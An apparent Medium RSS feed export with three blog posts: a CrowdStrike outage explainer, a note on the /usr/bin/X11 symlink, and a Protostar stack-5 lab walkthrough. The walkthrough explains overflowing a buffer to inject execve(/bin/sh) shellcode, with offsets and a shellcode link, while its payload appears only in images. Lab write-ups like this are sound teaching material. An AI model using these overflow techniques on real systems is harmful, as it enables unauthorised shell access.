{"status":"ok","feed":{"url":"https://medium.com/feed/@tejas303525","title":"Stories by Prof.bubs on Medium","link":"https://medium.com/@tejas303525?source=rss-aabefe26c4b3------2","author":"","description":"Stories by Prof.bubs on Medium","image":"https://cdn-images-1.medium.com/fit/c/150/150/1*zohmMB_KerZXvSkYrKp0Kw.jpeg"},"items":[{"title":"NEWS: The day when a \u201cSecurity Snafu\u201d sent millions of computers to BSOD","pubDate":"2024-07-21 10:13:00","link":"https://tejas303525.medium.com/news-the-day-when-a-security-snafu-sent-millions-of-computers-to-bsod-da5abf0f9d45?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/da5abf0f9d45","author":"Prof.bubs","thumbnail":"","description":"\n<p>So as you all must have been aware of the huge tech outage that occurred on July 19th,2024 sent millions of computers spiraling to their Blue Screen of DOOM!. All the systems running Microsoft had their screen turn into Blue Screen Of Death(BSOD) after the update and just like that many organization stopped or struggled to continue their work and their employees had their moment of fun. So in this article, I will discuss about<em> who is responsible for it?</em> <em>How did this happen?</em> <em>what can be done in future to avoid these sort of\u00a0issues?</em></p>\n<h3>Who is responsible for this massive outbreak?</h3>\n<p>An American cybersecurity company popularly known as <strong>CrowdStrike Holdings, Inc</strong> was the company that pushed an update to systems having their third party software installed\u00a0,<strong>crowdstrike falcon, </strong>to cause all the crashes. So that means only systems having this 3rd party software crashed and it didn't affect any other operating systems or systems that didn't have their software.</p>\n<p>According to Wikipedia:</p>\n<blockquote>\n<strong>CrowdStrike Holdings, Inc.</strong> is an American <a href=\"https://en.wikipedia.org/wiki/Computer_security\">cybersecurity</a> technology company based in <a href=\"https://en.wikipedia.org/wiki/Austin,_Texas\">Austin, Texas</a>. It provides cloud workload protection and <a href=\"https://en.wikipedia.org/wiki/Endpoint_security\">endpoint security</a>, <a href=\"https://en.wikipedia.org/wiki/Threat_Intelligence_Platform\">threat intelligence</a>, and <a href=\"https://en.wikipedia.org/wiki/Cyberattack\">cyberattack</a> response\u00a0services</blockquote>\n<p><strong>Crowdstrike falcon</strong> is popularly known as \u201cEndpoint detection and response\u201d(EDR) software. So its like an antivirus that checks your system is compromised or not. They pushed a update to vulnerability scanner but had flaws in their updated code to cause the\u00a0crashes.</p>\n<p>NOW DIVING A LIL BIT MORE TECHNICAL!<br>Now they run their code at a kernel level on our systems. We gave them those privileges upon installing this software. They run their code as a <strong>Kernel mode driver (.sys files). </strong>But it makes sense for these antivirus software to be run at a kernel level so that they can monitor our system as a\u00a0whole.</p>\n<h3>How can we fix\u00a0this?</h3>\n<p>Now this issue can be fixed, you can refer to <a href=\"https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/\">https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/</a> on how can we fix this issue. Basically, you have to boot into safe mode from your BIOS where it doesn\u2019t install drivers and then manually navigate to the \u201c<strong>C-00000291*.sys</strong>\u201d file and remove\u00a0it.</p>\n<p><em>If all these seems a bit too much then there is a second options. Which is to wait patiently until they push another patch update for your system\u00a0:)\u00a0.</em></p>\n<h3>What exactly happened?</h3>\n<p>Now that\u00a0.sys file which got shipped to our system got corrupted somehow. It was all\u00a0null!.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*PRa9rRT0B1ObJ0Nym9Df_A.png\"><figcaption>.sys file from a twitter\u00a0user</figcaption></figure><p>So all your system got as a update was my math mark (jk I didn\u2019t score 0 in my math test, please don\u2019t tell my mom). So your computer was like \u00af\\(\u30c4)/\u00af and then BOOM!\u00a0BSOD.</p>\n<p>Now, you might wonder why don\u2019t we just disable the driver\u00a0. Well here is the thing, any antivirus software that you have installed on your system\u00a0, while upon powering up your system, starts a boot-start driver. What it does is that\u00a0, it will tell your system to load up the drivers to start your system with a safe environment. Logically thinking, an antivirus driver is deemed as an safe driver which is needed for a safe environment for our systems. So your\u00a0.sys file starts at the very boot level along with your OS once you turn on your computer. And that\u00a0.sys file is full of nulls which lead to your blue-screen at recovery.</p>\n<h3>What could have been\u00a0done?</h3>\n<p>One of my close friend talks about this on his LinkedIn post, please do refer his post <a href=\"https://www.linkedin.com/posts/activity-7220664121506115584-ARNf?utm_source=share&amp;utm_medium=member_desktop\">https://www.linkedin.com/posts/activity-7220664121506115584-ARNf?utm_source=share&amp;utm_medium=member_desktop</a>. He talks about how important it is for this high end tech companies to do testing of their product before pushing it to the world. It is quite important for people to understand what are these companies capable of doing to our system before blinding accepting all their terms and condition. Of-course an outage like this cant be blamed on the end users but on the company themself.</p>\n<p>The irony is that we gave permission to sit at kernel level for a piece of software in our system to protect us only to end up in a ditch by the very thing that was supposed to protect us. This wasn\u2019t a hack but was merely a fault in our code. It could have been\u00a0worse!.</p>\n<p>Interested in knowing more? Watch <a href=\"https://www.youtube.com/watch?v=pCxvyIx922A\"><strong>https://www.youtube.com/watch?v=pCxvyIx922A</strong></a><strong> by Low Level Learning, </strong>to understand how this was a null pointer d reference problem.</p>\n<p>My references:</p>\n<p><a href=\"https://en.wikipedia.org/wiki/CrowdStrike\">https://en.wikipedia.org/wiki/CrowdStrike</a></p>\n<p><a href=\"https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/\">Falcon Content Update Remediation and Guidance Hub | CrowdStrike</a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=da5abf0f9d45\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>So as you all must have been aware of the huge tech outage that occurred on July 19th,2024 sent millions of computers spiraling to their Blue Screen of DOOM!. All the systems running Microsoft had their screen turn into Blue Screen Of Death(BSOD) after the update and just like that many organization stopped or struggled to continue their work and their employees had their moment of fun. So in this article, I will discuss about<em> who is responsible for it?</em> <em>How did this happen?</em> <em>what can be done in future to avoid these sort of\u00a0issues?</em></p>\n<h3>Who is responsible for this massive outbreak?</h3>\n<p>An American cybersecurity company popularly known as <strong>CrowdStrike Holdings, Inc</strong> was the company that pushed an update to systems having their third party software installed\u00a0,<strong>crowdstrike falcon, </strong>to cause all the crashes. So that means only systems having this 3rd party software crashed and it didn't affect any other operating systems or systems that didn't have their software.</p>\n<p>According to Wikipedia:</p>\n<blockquote>\n<strong>CrowdStrike Holdings, Inc.</strong> is an American <a href=\"https://en.wikipedia.org/wiki/Computer_security\">cybersecurity</a> technology company based in <a href=\"https://en.wikipedia.org/wiki/Austin,_Texas\">Austin, Texas</a>. It provides cloud workload protection and <a href=\"https://en.wikipedia.org/wiki/Endpoint_security\">endpoint security</a>, <a href=\"https://en.wikipedia.org/wiki/Threat_Intelligence_Platform\">threat intelligence</a>, and <a href=\"https://en.wikipedia.org/wiki/Cyberattack\">cyberattack</a> response\u00a0services</blockquote>\n<p><strong>Crowdstrike falcon</strong> is popularly known as \u201cEndpoint detection and response\u201d(EDR) software. So its like an antivirus that checks your system is compromised or not. They pushed a update to vulnerability scanner but had flaws in their updated code to cause the\u00a0crashes.</p>\n<p>NOW DIVING A LIL BIT MORE TECHNICAL!<br>Now they run their code at a kernel level on our systems. We gave them those privileges upon installing this software. They run their code as a <strong>Kernel mode driver (.sys files). </strong>But it makes sense for these antivirus software to be run at a kernel level so that they can monitor our system as a\u00a0whole.</p>\n<h3>How can we fix\u00a0this?</h3>\n<p>Now this issue can be fixed, you can refer to <a href=\"https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/\">https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/</a> on how can we fix this issue. Basically, you have to boot into safe mode from your BIOS where it doesn\u2019t install drivers and then manually navigate to the \u201c<strong>C-00000291*.sys</strong>\u201d file and remove\u00a0it.</p>\n<p><em>If all these seems a bit too much then there is a second options. Which is to wait patiently until they push another patch update for your system\u00a0:)\u00a0.</em></p>\n<h3>What exactly happened?</h3>\n<p>Now that\u00a0.sys file which got shipped to our system got corrupted somehow. It was all\u00a0null!.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*PRa9rRT0B1ObJ0Nym9Df_A.png\"><figcaption>.sys file from a twitter\u00a0user</figcaption></figure><p>So all your system got as a update was my math mark (jk I didn\u2019t score 0 in my math test, please don\u2019t tell my mom). So your computer was like \u00af\\(\u30c4)/\u00af and then BOOM!\u00a0BSOD.</p>\n<p>Now, you might wonder why don\u2019t we just disable the driver\u00a0. Well here is the thing, any antivirus software that you have installed on your system\u00a0, while upon powering up your system, starts a boot-start driver. What it does is that\u00a0, it will tell your system to load up the drivers to start your system with a safe environment. Logically thinking, an antivirus driver is deemed as an safe driver which is needed for a safe environment for our systems. So your\u00a0.sys file starts at the very boot level along with your OS once you turn on your computer. And that\u00a0.sys file is full of nulls which lead to your blue-screen at recovery.</p>\n<h3>What could have been\u00a0done?</h3>\n<p>One of my close friend talks about this on his LinkedIn post, please do refer his post <a href=\"https://www.linkedin.com/posts/activity-7220664121506115584-ARNf?utm_source=share&amp;utm_medium=member_desktop\">https://www.linkedin.com/posts/activity-7220664121506115584-ARNf?utm_source=share&amp;utm_medium=member_desktop</a>. He talks about how important it is for this high end tech companies to do testing of their product before pushing it to the world. It is quite important for people to understand what are these companies capable of doing to our system before blinding accepting all their terms and condition. Of-course an outage like this cant be blamed on the end users but on the company themself.</p>\n<p>The irony is that we gave permission to sit at kernel level for a piece of software in our system to protect us only to end up in a ditch by the very thing that was supposed to protect us. This wasn\u2019t a hack but was merely a fault in our code. It could have been\u00a0worse!.</p>\n<p>Interested in knowing more? Watch <a href=\"https://www.youtube.com/watch?v=pCxvyIx922A\"><strong>https://www.youtube.com/watch?v=pCxvyIx922A</strong></a><strong> by Low Level Learning, </strong>to understand how this was a null pointer d reference problem.</p>\n<p>My references:</p>\n<p><a href=\"https://en.wikipedia.org/wiki/CrowdStrike\">https://en.wikipedia.org/wiki/CrowdStrike</a></p>\n<p><a href=\"https://www.crowdstrike.com/falcon-content-update-remediation-and-guidance-hub/\">Falcon Content Update Remediation and Guidance Hub | CrowdStrike</a></p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=da5abf0f9d45\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["cybersecurity","buffer-overflow","microsoft","news"]},{"title":"Mysterious X11: Linux shenanigans","pubDate":"2024-05-23 19:39:42","link":"https://tejas303525.medium.com/mysterious-x11-linux-shenanigans-e280bb3a56f4?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/e280bb3a56f4","author":"Prof.bubs","thumbnail":"","description":"\n<p>Well well\u00a0well!..</p>\n<a href=\"https://medium.com/media/ad7d9cc3a9b0d2c38dc0cd817a6b0825/href\">https://medium.com/media/ad7d9cc3a9b0d2c38dc0cd817a6b0825/href</a><p>it's been quite a long time since I wrote any medium blog post, And I wanted to start writing again not only about cybersecurity-related stuff but more on a general aspect when it comes to information technology, So from now you can expect articles about AI wars, new techs from google I/O launch and much more interesting, intriguing and DEFINITELY COOL stuffs. Like the one RIGHT\u00a0NOW!!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/218/0*voObAuKlR1z59ixN\"></figure><p>Anyways, So what is this X11 directory? and why is it there in Linux and most importantly how did I come across\u00a0this?</p>\n<p>I will start my answering with the last question, I stumbled upon this directory..quite..randomly \u00af\\_(\u30c4)_/\u00af. I was just cleaning up my drive to free up my space and I came across this folder in my <em>/usr/bin/</em>, I was going through files in it and X11 was a directory, which opened another X11 directory, which opened another X11 directory, which opened another X11 directory, which\u2026you get the idea\u00a0right!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/531/1*hR7h97M2QEJLRjvb4AUSvA.png\"></figure><p>I freaked out! I thought this was eating my space. The contents on every level were the same as the contents on the previous directory. So I was pretty confused. Did I somehow recursively create folder after folder on my own?\u00a0, Since when did this start happening? How much space did it\u00a0eat?</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/679/1*KqFGrsr7HETkRX6oce7vjg.png\"><figcaption>command to check storage:\u00a0df</figcaption></figure><p>Immediately I thought of deleting ALL the directories except one because it did have a lot of other important directories inside. For a second there I was also relieved because deleting this guy would mean I get to have half my space back(or so I thought\u00a0:)).But first!, I decided to do a bit of research on my own. So I googled it and found that it was intentional by\u00a0Linux</p>\n<a href=\"https://medium.com/media/9d75d860d3c4a2d66f2d6ea836bca394/href\">https://medium.com/media/9d75d860d3c4a2d66f2d6ea836bca394/href</a><h3>BIG REVEAL:</h3>\n<p>The <em>/usr/bin/X11 </em>is a symlink(symbolic link) that points to /usr/bin\u00a0itself.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/200/0*LttLdxkxNRcRrbOc\"></figure><p>YES! That's correct, it's a link pointing to its own, there weren't infinite X11 directories, there was only one which was pointing to /usr/bin (it was at this point I started flushing down my dream of having more space\ud83e\udd72).</p>\n<p>It is like those horror movies where the main character keeps on climbing up the floor but never actually progresses a single floor further up so the protagonist is stuck in a loop on the same floor. Likewise, you can keep moving to an infinite number of X11 directories but YOU.ARE.ACTUALLY.FACTUALLY.STANDING.ON.THE.SAME.DIRECTORY!!. BUT YOU WILL NEVER PROGRESS A SINGLE DIRECTORY UP, YOU NEVER DID, AND YOU NEVER WILL. DUN DUN DUNNN!!!!</p>\n<h3>REASON:</h3>\n<p>According to my source:<a href=\"https://askubuntu.com/questions/191654/why-are-there-infinitely-many-x11-subdirectories-in-usr-bin-x11\"><strong><em>askubuntu</em></strong></a><strong><em>, </em></strong>this is done for compatibility reasons as<strong><em> </em></strong>few programs expect other programs to be in <em>/usr/bin. </em>Now honestly I don't exactly understand how that works, If my understanding is correct maybe some program in /usr/bin requires it to access another program in /usr/bin, which for some reason it can't access directly, so I think it will go around by jumping into X11 directory and land back to /usr/bin to choose the program it requires.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/547/1*fJGNU3WvKpjUeGYRtvXwMg.png\"></figure><p>I checked the permissions for this directory. The \u2018<em>l\u2019 </em>and the start say that it is a <strong>link </strong>which is pointing to<strong>\u00a0./\u00a0</strong>.</p>\n<h3>CONCLUSION:</h3>\n<p>This was really an interesting find. Every day I get to learn cool stuff about Linux. (\u201cEveryday\u201d might be overkill). But I do hope you found this as interesting and intriguing as I did. If you did, please throw in some claps and give me suggestions on what we can discuss next in the comments. Until then TAKE\u00a0CARE!</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=e280bb3a56f4\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>Well well\u00a0well!..</p>\n<a href=\"https://medium.com/media/ad7d9cc3a9b0d2c38dc0cd817a6b0825/href\">https://medium.com/media/ad7d9cc3a9b0d2c38dc0cd817a6b0825/href</a><p>it's been quite a long time since I wrote any medium blog post, And I wanted to start writing again not only about cybersecurity-related stuff but more on a general aspect when it comes to information technology, So from now you can expect articles about AI wars, new techs from google I/O launch and much more interesting, intriguing and DEFINITELY COOL stuffs. Like the one RIGHT\u00a0NOW!!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/218/0*voObAuKlR1z59ixN\"></figure><p>Anyways, So what is this X11 directory? and why is it there in Linux and most importantly how did I come across\u00a0this?</p>\n<p>I will start my answering with the last question, I stumbled upon this directory..quite..randomly \u00af\\_(\u30c4)_/\u00af. I was just cleaning up my drive to free up my space and I came across this folder in my <em>/usr/bin/</em>, I was going through files in it and X11 was a directory, which opened another X11 directory, which opened another X11 directory, which opened another X11 directory, which\u2026you get the idea\u00a0right!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/531/1*hR7h97M2QEJLRjvb4AUSvA.png\"></figure><p>I freaked out! I thought this was eating my space. The contents on every level were the same as the contents on the previous directory. So I was pretty confused. Did I somehow recursively create folder after folder on my own?\u00a0, Since when did this start happening? How much space did it\u00a0eat?</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/679/1*KqFGrsr7HETkRX6oce7vjg.png\"><figcaption>command to check storage:\u00a0df</figcaption></figure><p>Immediately I thought of deleting ALL the directories except one because it did have a lot of other important directories inside. For a second there I was also relieved because deleting this guy would mean I get to have half my space back(or so I thought\u00a0:)).But first!, I decided to do a bit of research on my own. So I googled it and found that it was intentional by\u00a0Linux</p>\n<a href=\"https://medium.com/media/9d75d860d3c4a2d66f2d6ea836bca394/href\">https://medium.com/media/9d75d860d3c4a2d66f2d6ea836bca394/href</a><h3>BIG REVEAL:</h3>\n<p>The <em>/usr/bin/X11 </em>is a symlink(symbolic link) that points to /usr/bin\u00a0itself.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/200/0*LttLdxkxNRcRrbOc\"></figure><p>YES! That's correct, it's a link pointing to its own, there weren't infinite X11 directories, there was only one which was pointing to /usr/bin (it was at this point I started flushing down my dream of having more space\ud83e\udd72).</p>\n<p>It is like those horror movies where the main character keeps on climbing up the floor but never actually progresses a single floor further up so the protagonist is stuck in a loop on the same floor. Likewise, you can keep moving to an infinite number of X11 directories but YOU.ARE.ACTUALLY.FACTUALLY.STANDING.ON.THE.SAME.DIRECTORY!!. BUT YOU WILL NEVER PROGRESS A SINGLE DIRECTORY UP, YOU NEVER DID, AND YOU NEVER WILL. DUN DUN DUNNN!!!!</p>\n<h3>REASON:</h3>\n<p>According to my source:<a href=\"https://askubuntu.com/questions/191654/why-are-there-infinitely-many-x11-subdirectories-in-usr-bin-x11\"><strong><em>askubuntu</em></strong></a><strong><em>, </em></strong>this is done for compatibility reasons as<strong><em> </em></strong>few programs expect other programs to be in <em>/usr/bin. </em>Now honestly I don't exactly understand how that works, If my understanding is correct maybe some program in /usr/bin requires it to access another program in /usr/bin, which for some reason it can't access directly, so I think it will go around by jumping into X11 directory and land back to /usr/bin to choose the program it requires.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/547/1*fJGNU3WvKpjUeGYRtvXwMg.png\"></figure><p>I checked the permissions for this directory. The \u2018<em>l\u2019 </em>and the start say that it is a <strong>link </strong>which is pointing to<strong>\u00a0./\u00a0</strong>.</p>\n<h3>CONCLUSION:</h3>\n<p>This was really an interesting find. Every day I get to learn cool stuff about Linux. (\u201cEveryday\u201d might be overkill). But I do hope you found this as interesting and intriguing as I did. If you did, please throw in some claps and give me suggestions on what we can discuss next in the comments. Until then TAKE\u00a0CARE!</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=e280bb3a56f4\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["tech","linux","x11"]},{"title":"PROTOSTAR WALKTHROUGH STACK-5","pubDate":"2022-04-10 20:12:00","link":"https://tejas303525.medium.com/protostar-walkthrough-stack-5-12cbfe97a8b6?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/12cbfe97a8b6","author":"Prof.bubs","thumbnail":"","description":"\n<p>Hello hackers! hope you are all doing well. I know I took some time off from posting writeups because of how busy I got over time (jk I was juz laaazyyyy). Anyways this challenge is something that was super interesting for me to do because I finally got to use shellcode. So I hope I spread some hacking wisdom out to the world to the best of my knowledge, without wasting any more of our time let's jump right into our question.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/302/1*34Ggv1VUlfu4rvf7AYtV6Q.png\"><figcaption>source:<a href=\"https://exploit.education/protostar/stack-five/\">https://exploit.education/protostar/stack-five/</a></figcaption></figure><p>AWW! look how cute this code looks\u2026\u2026OR IS\u00a0IT?!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/498/1*k2KmPb1TqHF72svOJqWNMA.gif\"></figure><p>Although this code looks quite simple, it opens up the opportunity for us to overflow the buffer space since it uses the \u201cgets\u201d function and also injects shellcode into the system\u2026BUT WHAT IS SHELLCODE THO?!\u00a0\ud83e\udd14</p>\n<blockquote>\u201cIn hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability\u201d</blockquote>\n<p>In layman's terms, you inject a shellcode in the rwx area you get a shell to that system. Sounds easy right\u00a0:).</p>\n<p>Well, it's not thaaat simple!\u00a0, you have to find a perfect spot on the stack with the correct number of bytes to be given for the payload for us to inject the shellcode. But on this specific challenge, we can simply have our shellcode on our stack and make it execute from the stack\u00a0itself.</p>\n<p>There is a website that gives us different types of shellcode depending upon the architecture that we use, its called <a href=\"http://shell-storm.org/shellcode/\">http://shell-storm.org/shellcode/</a></p>\n<p>For this specific challenge, I am going to use<strong> </strong><a href=\"http://shell-storm.org/shellcode/files/shellcode-811.php\"><strong>Linux/x86\u200a\u2014\u200aexecve(/bin/sh)\u200a\u2014\u200a28 bytes</strong></a><strong> <em>by Jean-Pascal Pereira.</em></strong></p>\n<h3>/opt/protostar/bin/stack5</h3>\n<p>Enough with the shellcode talk. let's disassemble the main and have a\u00a0look</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/719/1*AMHqNqPqXNmVofb9Zbmndw.png\"></figure><p>Here it does some \u201c<strong>and $0xfffffff0,%esp</strong>\u201d which we are clueless about so we will get there in a minute, after that it <strong>\u201csub $0x50,%esp\u201d </strong>meaning it's allocation 0x50=80 bytes into the stack. After that \u201c<strong>lea 0x10(%esp),%eax</strong>\u201d, which is equivalent to \u201c<strong>lea eax,[esp+0x10]</strong>\u201d (I have not set my disassembly-flavor to intel which is why the above image has such a type of o/p), lea stands for Load Effective Adress, <em>The LEA instruction computes a memory address using the same arithmetic that a MOV instruction uses. But unlike the MOV instruction, the LEA instruction just stores the computed address in its target register, instead of loading the contents of that address and storing it.</em> And esp+10. This means from<em> esp+0x10 </em>our area for our buffer\u00a0starts.</p>\n<p>we can even cross-check this with simple\u00a0math.</p>\n<blockquote>total space-lea(esp+0x10)= 0x50\u20130x10=0x40=64</blockquote>\n<p>Now, this is the buffer space that was given to us on our code\u00a0:D.</p>\n<p>Still don't quite catch it. Maybe my artwork will help you but before that, we need to understand how much space is \u201c<strong>and $0xfffffff0,%esp</strong>\u201d operation allocated for.</p>\n<p>So for that, I keep a breakpoint just after that operation and inspect my registers.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/727/1*yOa_jSzHCQy1gTLz9dohBg.png\"></figure><p>This operation happens exactly after \u201c<strong>mov ebp,esp\u201d </strong>and on the inspection with the \u201ci r\u201d command we can clearly understand that there is a difference in 8 bytes from ebp to esp meaning 8 bytes gets allocated to esp from\u00a0ebp.</p>\n<p>Now keeping all this in mind, I drew my \u2018MONA LISA\u2019 of a\u00a0stack..</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*rNR2IXCUhthan0J-PX8znw.png\"><figcaption>5th instruction</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*AyD4r7zdsVq8bov4gtf3-Q.png\"><figcaption>6th instruction</figcaption></figure><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*OB2Srp4bzKBHKutUNquPQg.png\"><figcaption>My \u2018Mona-Lisa\u2019 stack</figcaption></figure><p>EY..EY! DON\u2019T LAUGH AT MY MASTERPIECE(\uff89\u0ca5\u76ca\u0ca5\uff09\uff89 \u253b\u2501\u253b.</p>\n<h3>EXPLOITATION:</h3>\n<p>Now for the juicy part\u00a0HACKING!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/640/1*C3a1JyNvxgDKwDiZxn7tPw.gif\"></figure><p>Now since we know how the stack looks thanks to my artwork, we can finally decide on much bytes to be sent to reach the eip region/return area.</p>\n<blockquote>bufferspace+8bytes +ebp=64+8+4=76bytes</blockquote>\n<p>So we need 76 bytes to reach the eip region. But return to\u00a0where???</p>\n<p>This is where shellcodes come into play. We write our shellcode first into the buffer space and then pad it all to the eip/return region and return it to the shellcode area.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bXhM1KaTm222DU3jLcqg7g.png\"><figcaption>Plan of\u00a0attack!</figcaption></figure><p>Our shellcode is of 28 bytes, our buffer is 64bytes which means after writing the shellcode I have 36 bytes of buffer space remaining.</p>\n<blockquote>bufferspace+8bytes +ebp=36+8+4=48bytes</blockquote>\n<p>Now we have to find tge start of the buffer space. As we can see on our Plan of attack! diagram, the start of buffer space os esp+0x10.</p>\n<p>To find our esp address. Set a breakpoint at main and run the\u00a0gdb.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/470/1*35ndvml55BWzKuQH7w2wxg.png\"></figure><p>Ok so our esp value ends with 60 and we add 0x10 to it and we\u00a0get</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/278/1*J_YozNEZdvIDR3SFM-fZww.png\"></figure><p>So according to our calculations, this must be exactly where our buffer area\u00a0starts.</p>\n<p>Time to put up the\u00a0payload!</p>\n<h3>payload:</h3>\n<p>Our payload is simple, write the shellcode in the buffer, padded it till eip region, and the return to the space where the shellcode was written so that the program will execute\u00a0it</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/393/1*2-inKeAhQ2P-I864virwmg.png\"></figure><p>Now in order to send this payload, we have to copy this to a file and then cat it to the binary\u00a0file.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/808/1*eumMZcexz_Vtz-PCC7BSHw.png\"></figure><p>BOOM! shell! \u033f\u033f \u033f\u033f \u033f\u033f \u033f\u2019\u033f\u2019\\\u0335\u0347\u033f\u033f\\\u0437= ( \u2580 \u035c\u035e\u0296\u2580) =\u03b5/\u0335\u0347\u033f\u033f/\u2019\u033f\u2019\u033f \u033f \u033f\u033f \u033f\u033f\u00a0\u033f\u033f</p>\n<p>BUT! there is a catch to this. This won\u2019t work all the time because of stack alignment and current directory and so on and so\u00a0forth.</p>\n<p>So what can we do about that? How do we rectify this situation? where else can we inject our code. FOOD FOR THOUGHT!(\u3145\u00b4 \u02d8\u00a0`)\u2661</p>\n<p>I will explain it in my upcoming posts. Until then take care, bye\u00a0byee!</p>\n<p>If you think this walkthrough helped you in any way please do leave a like and thank you once again for reading.\u00a0:)</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=12cbfe97a8b6\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<p>Hello hackers! hope you are all doing well. I know I took some time off from posting writeups because of how busy I got over time (jk I was juz laaazyyyy). Anyways this challenge is something that was super interesting for me to do because I finally got to use shellcode. So I hope I spread some hacking wisdom out to the world to the best of my knowledge, without wasting any more of our time let's jump right into our question.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/302/1*34Ggv1VUlfu4rvf7AYtV6Q.png\"><figcaption>source:<a href=\"https://exploit.education/protostar/stack-five/\">https://exploit.education/protostar/stack-five/</a></figcaption></figure><p>AWW! look how cute this code looks\u2026\u2026OR IS\u00a0IT?!</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/498/1*k2KmPb1TqHF72svOJqWNMA.gif\"></figure><p>Although this code looks quite simple, it opens up the opportunity for us to overflow the buffer space since it uses the \u201cgets\u201d function and also injects shellcode into the system\u2026BUT WHAT IS SHELLCODE THO?!\u00a0\ud83e\udd14</p>\n<blockquote>\u201cIn hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability\u201d</blockquote>\n<p>In layman's terms, you inject a shellcode in the rwx area you get a shell to that system. Sounds easy right\u00a0:).</p>\n<p>Well, it's not thaaat simple!\u00a0, you have to find a perfect spot on the stack with the correct number of bytes to be given for the payload for us to inject the shellcode. But on this specific challenge, we can simply have our shellcode on our stack and make it execute from the stack\u00a0itself.</p>\n<p>There is a website that gives us different types of shellcode depending upon the architecture that we use, its called <a href=\"http://shell-storm.org/shellcode/\">http://shell-storm.org/shellcode/</a></p>\n<p>For this specific challenge, I am going to use<strong> </strong><a href=\"http://shell-storm.org/shellcode/files/shellcode-811.php\"><strong>Linux/x86\u200a\u2014\u200aexecve(/bin/sh)\u200a\u2014\u200a28 bytes</strong></a><strong> <em>by Jean-Pascal Pereira.</em></strong></p>\n<h3>/opt/protostar/bin/stack5</h3>\n<p>Enough with the shellcode talk. let's disassemble the main and have a\u00a0look</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/719/1*AMHqNqPqXNmVofb9Zbmndw.png\"></figure><p>Here it does some \u201c<strong>and $0xfffffff0,%esp</strong>\u201d which we are clueless about so we will get there in a minute, after that it <strong>\u201csub $0x50,%esp\u201d </strong>meaning it's allocation 0x50=80 bytes into the stack. After that \u201c<strong>lea 0x10(%esp),%eax</strong>\u201d, which is equivalent to \u201c<strong>lea eax,[esp+0x10]</strong>\u201d (I have not set my disassembly-flavor to intel which is why the above image has such a type of o/p), lea stands for Load Effective Adress, <em>The LEA instruction computes a memory address using the same arithmetic that a MOV instruction uses. But unlike the MOV instruction, the LEA instruction just stores the computed address in its target register, instead of loading the contents of that address and storing it.</em> And esp+10. This means from<em> esp+0x10 </em>our area for our buffer\u00a0starts.</p>\n<p>we can even cross-check this with simple\u00a0math.</p>\n<blockquote>total space-lea(esp+0x10)= 0x50\u20130x10=0x40=64</blockquote>\n<p>Now, this is the buffer space that was given to us on our code\u00a0:D.</p>\n<p>Still don't quite catch it. Maybe my artwork will help you but before that, we need to understand how much space is \u201c<strong>and $0xfffffff0,%esp</strong>\u201d operation allocated for.</p>\n<p>So for that, I keep a breakpoint just after that operation and inspect my registers.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/727/1*yOa_jSzHCQy1gTLz9dohBg.png\"></figure><p>This operation happens exactly after \u201c<strong>mov ebp,esp\u201d </strong>and on the inspection with the \u201ci r\u201d command we can clearly understand that there is a difference in 8 bytes from ebp to esp meaning 8 bytes gets allocated to esp from\u00a0ebp.</p>\n<p>Now keeping all this in mind, I drew my 